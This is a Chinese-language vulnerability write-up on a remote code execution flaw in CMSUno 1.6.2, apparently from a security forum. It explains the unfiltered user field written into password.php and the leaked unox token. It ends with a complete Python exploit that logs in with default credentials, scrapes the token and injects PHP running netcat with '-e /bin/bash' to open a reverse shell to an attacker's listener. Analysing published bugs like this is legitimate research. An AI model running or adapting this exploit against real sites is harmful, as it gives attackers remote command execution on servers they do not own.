前言
==

CMSUno是法国Jacques Malgrange软件开发者的一款用于创建单页响应式网站的工具  
下文是基于对EXP的分析得来的，EXP原作者:Fatih Çelik，另外为了方便分析复现，对EXP做了小幅度的修改。  
该漏洞现已修复，相关链接在末尾

漏洞原理分析
======

漏洞点
---

### 0x01

在uno/central.php  
269:case sauvePass  
可以看到273行$a接收到post的user值之后中间没有经过任何过滤，在280行直接拼接进准备写入的PHP代码，并在满足else if条件后直接将接收到的值写入password.php  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d39068fcee744ce660aee40764612e9999a61a60.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d39068fcee744ce660aee40764612e9999a61a60.png)

### 0x02

可以看到在uno.php 36行对用户名密码，unox，$\_SESSION判断非空后，在用户名密码验证前include了password.php，若在此之前向user传入  
恶意php代码并写入password.php,恶意代码便能顺利执行。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d5906cb285472296e9c2ec2bb34ef5ccccf0b663.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d5906cb285472296e9c2ec2bb34ef5ccccf0b663.png)

### 0x03

这套源码中开头都会判断一个unox值，本意上是为了防止csrf，及越级访问  
初次访问uno.php时进入99行会随机生成值并存进$\_SESSION\['unox'\]中  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c27698dc3087f32e26f4376d209e0fb087764feb.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c27698dc3087f32e26f4376d209e0fb087764feb.png)  
但作者似乎时为了图方便直接在混合编写时在下方132行html代码中直接echo $unox，写在表单中，用于和用户提交的用户名密码一起POST  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-7234d538abeb8d1c73799a3faa613a203ebbe440.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-7234d538abeb8d1c73799a3faa613a203ebbe440.png)  
用户成功登录后便会进入uno.php 93行，重新随机生成一个$unox值，但同样，在edition.php 24行html代码中直接echo $unox在js脚本中，这使得劫持$unox，越级访问central.php成为可能  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-36a910d2396a65e65fb17b689ed9ce4facc8b400.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-36a910d2396a65e65fb17b689ed9ce4facc8b400.png)

归纳整个利用过程
--------

访问uno.php并正常登录 --&gt; 读取并劫持edition.php echo在js代码中的unox值 --&gt; 携带unox值往central.php POST满足 279行条件的值 --&gt; 往uno.php POST满足 33行的值触发password.php中的恶意代码

漏洞复现
====

查看攻击机ip并开启监听  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-f5f107c7246ae04f5fedc44d684d318ca1342d87.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-f5f107c7246ae04f5fedc44d684d318ca1342d87.png)  
执行EXP  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d1d859b7d91dce8bb39c542eaabd6602dc05eefe.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d1d859b7d91dce8bb39c542eaabd6602dc05eefe.png)  
接收到反弹shell  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-3e867bce0ae8cc944c94c95ad6ccd5fd5e92c645.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-3e867bce0ae8cc944c94c95ad6ccd5fd5e92c645.png)

EXP
---

```python
import requests
from bs4 import BeautifulSoup
import lxml
import json
from time import sleep

#默认用户名密码
username = 'cmsuno'
password = '654321'
root_url = 'http://192.168.127.128/cmsuno_1.6.2' #网站根目录，不包含uno.php

#接收shell地址
listener_ip = input("输入监听地址:")
listener_port = input("输入监听端口:")

login_url = root_url + "/uno.php"
vulnerable_url = root_url + "/uno/central.php"

session = requests.Session()
request = session.get(login_url)

#获取页面输入框
soup = BeautifulSoup(request.text,"lxml")
unox = soup.find("input",{'name':'unox'})['value']
print(unox)

#执行正常登录 ，由于是脚本所以需要读取并携带unox
body = {"unox":unox,"user":username,"pass":password}
session.post(login_url, data=body)

request = session.get(login_url)
text = request.text
soup = BeautifulSoup(text,"lxml")
script = soup.findAll('script')[1].string
data = script.split("Unox='")[1]
unox = data.split("',")[0]

#exploit
header = {
"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/90.0.2",
"Accept":"*/",
"Accept-Encoding": "gzip, deflate",
"X-Requested-With": "XMLHttpRequest",
"Origin": login_url,
"Referer": login_url
}

payload = 'en";system(\'nc.traditional {} {} -e /bin/bash\');?>// '.format(listener_ip,listener_port)  #注入PHP代码反弹shell
body = 'action=sauvePass&unox={}&user0={}&pass0={}&user={}&pass=654321&lang=en'.format(unox,username,password,payload) 
session.post(vulnerable_url, data=(json.dumps(body)).replace("\\","")[1:-1],headers=header)

#再次执行登录以触发 password.php 执行恶意代码 由于是脚本所以需要读取并携带unox
session1 = requests.Session()
request1 = session1.get(login_url)
soup = BeautifulSoup(request1.text,"lxml")
unox = soup.find("input",{'name':'unox'})['value']

# Login
sleep(3)
body = {"unox":unox,"user":username,"pass":password}
session1.post(login_url, data=body)
```

相关链接  
<https://www.exploit-db.com/exploits/49031>  
<https://fatihhcelik.blogspot.com/2020/09/cmsuno-162-remote-code-execution.html>  
<https://github.com/boiteasite/cmsuno/archive/refs/tags/1.6.2.zip>